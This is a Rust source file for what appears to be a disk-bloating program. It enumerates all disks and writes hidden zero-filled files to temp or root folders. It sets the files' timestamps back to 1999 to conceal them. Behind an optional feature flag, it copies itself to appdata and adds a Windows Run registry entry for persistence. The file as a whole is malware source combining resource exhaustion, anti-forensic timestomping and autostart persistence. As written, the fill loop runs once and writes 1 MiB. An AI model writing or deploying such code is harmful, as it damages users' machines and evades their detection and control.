extern crate winapi;

use winreg::enums::RegType::REG_BINARY;
use winreg::enums::{HKEY_CURRENT_USER, KEY_READ, KEY_SET_VALUE};
use winreg::{RegKey, RegValue};
static AL_REGKEY: &str = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

use core::slice;
use std::fs::*;
use std::io::*;

#[cfg(target_os = "windows")]
use std::os::windows::prelude::*;

use std::path::Path;
use rand::Rng;
use regex::Regex;
use sysinfo::Disks;
use filetime::{set_file_times,FileTime};


// Slice the string to get the root disk letter if it's Windows
fn slice_string(input: &str) -> &str {
	// Define the pattern to detect the filesystem : Windows or Unix
	let pattern = Regex::new(r"(\\)|(/)").unwrap();
	let parts: Vec<&str> = pattern.split(input).collect();

	// Return the root folder
	return parts[0];
}

#[cfg(target_os = "windows")]
// Create the file when compiled on Windows system
fn create_file(path: &str, name:u64, data: Vec<u8>) -> String{	

	let path_file: String = format!("{}{}.bh",path,name);
	let _ = File::options().create(true).write(true).attributes(winapi::um::winnt::FILE_ATTRIBUTE_HIDDEN).open(&path_file).expect("Valid filepath").write_all(&data);

	return path_file

}

#[cfg(target_os = "linux")]
// Create the file when compiled on Linux system
fn create_file(path: &str, name:u64, data: Vec<u8>) -> String{	

	let path_file: String = format!("{}.{}.bh",path,name);

	// Create an hidden file (linux only)
	let mut file = File::create(&path_file);
	let _ = file.write_all(&data);

	return path_file

}

#[cfg(target_os = "windows")]
// Adding persistence for the windows compilation
fn adding_persistence(filepath: &str) -> std::io::Result<()>{
	let original_path = std::env::current_exe()?;
    let new_path = format!("{}{}",Path::new(r"%appdata%/").display(),"bloater_copy.exe");

    let mut f ;
	let mut buffer:Vec<u8> = Vec::new();

    let file = match File::open(&original_path){
		Ok(mut file) => {
			file.read_to_end(&mut buffer);
			f = File::create(&new_path).unwrap();
		},
		Err(err) => {
			println!("File not found");
			std::process::exit(1);
		}

	};        

	f.write_all(&buffer);

    println!("Created a copy of {} at {}", original_path.display(), new_path);

	let name = "rust_bloater";


	
	let hkcu = RegKey::predef(HKEY_CURRENT_USER);
        hkcu.open_subkey_with_flags(AL_REGKEY, KEY_SET_VALUE)?
            .set_value::<_, _>(
                &name,
                &str::replace(&new_path, "/", r"\"),
            )?;



	Ok(())
}


#[cfg(target_os = "linux")]
// Adding persistenec for the linux compilation
fn adding_persistence(path: &str) -> std::io::Result<()>{
	Ok(())	
}




fn main() -> std::io::Result<()> {

	// Get a list of the disks on the machine
	let disks = Disks::new_with_refreshed_list();	
	let mut disk_array = Vec::new();

	// Add all the disks found in an array
	for disk in &disks {
		let info:(&str, u64, u64) = (slice_string(disk.mount_point().to_str().unwrap()), disk.total_space(), disk.available_space());		
		disk_array.push(info);
		println!("Disk : {:?}",info);

	}	

	// Bloating each disks found
	for disk in disk_array{

		// Separate informations of the disk found
		let (disk_root, total_space, available_space) = disk;

		// Search for a valid path to write to
		let mut valid_path = String::new();
		// Try different path on the disk where it can write to
		let path_array = [r"/temp/", r"/tmp/", r"/"];
		let mut has_found_path = false;

		for path in path_array {
		let temp_path:String = format!("{}{}",disk_root, path).as_str().to_string();
		println!("Trying path : {}", temp_path);
		// If a valid path is found
		if Path::new(&temp_path).is_dir() {
			valid_path = temp_path; 
			println!("Valid path : {}", valid_path);
			has_found_path = true;
			break;
			}
		}

		// If no paths are found
		if !has_found_path{
			// Select the next disks
			continue
		}
		// At this point, we found a valid folder for the disk

		// Create a random number
		let mut rng = rand::thread_rng();
		
		// Create the files
		for _ in 1..2{

			// Generate a random numbers
			let n2:u64 = rng.gen();

			// 1Mo =  1_048_576
			// 16Mo = 16_777_216
			// 128Mo = 134_217_728

			let size = available_space / 100;

			// Vec with specified size (number of elements in the vector)
			//let encoded: Vec<u8> = vec![0;size.try_into().unwrap()];
			let encoded: Vec<u8> = vec![0;1_048_576];

			let path_file: String = create_file(&valid_path,n2,encoded);
			
			// Change the access and modified date to 1999
			let _ = set_file_times(path_file, FileTime::from_unix_time(915148800,0),FileTime::from_unix_time(915148800,0));

			}

			println!("VAR HOME : {:?}", std::env::var("HOMEPATH"));

			#[cfg(feature="persistent")]{
				adding_persistence(&valid_path);
				}
			

	}	

	
	Ok(())

}
